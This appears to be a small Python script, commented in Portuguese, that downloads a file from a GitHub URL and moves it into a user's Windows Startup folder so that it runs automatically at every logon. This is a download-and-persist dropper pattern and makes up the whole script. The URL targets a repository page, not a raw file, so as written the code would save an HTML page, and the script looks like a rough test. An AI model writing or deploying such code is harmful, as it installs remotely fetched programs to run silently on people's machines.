import os
import shutil
import requests

def download_arquivo(url, destino):
    resposta = requests.get(url, stream=True)
    resposta.raise_for_status()

    nome_arquivo = url.split('/')[-1]
    caminho_temp = os.path.join(destino, nome_arquivo)

    with open(caminho_temp, 'wb') as arquivo:
        for chunk in resposta.iter_content(chunk_size=8192):
            arquivo.write(chunk)

    return caminho_temp

def mover_arquivo(caminho_arquivo, diretorio_destino):
    if not os.path.exists(diretorio_destino):
        os.makedirs(diretorio_destino)

    nome_arquivo = os.path.basename(caminho_arquivo)
    caminho_destino = os.path.join(diretorio_destino, nome_arquivo)

    try:
        shutil.move(caminho_arquivo, caminho_destino)
        print(f"Arquivo movido para {caminho_destino}")
    except Exception as e:
        print(f"Ocorreu um erro ao mover o arquivo: {e}")

def main():
    url = 'https://github.com/ligeirinho777/requeststeste'
    diretorio_destino = 'C:/Users/Ligeirinho/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'

    diretorio_temp = os.path.expanduser('~/Downloads')

    caminho_arquivo = download_arquivo(url, diretorio_temp)
    print(f"Arquivo baixado para {caminho_arquivo}")

    mover_arquivo(caminho_arquivo, diretorio_destino)

if __name__ == "__main__":
    main()
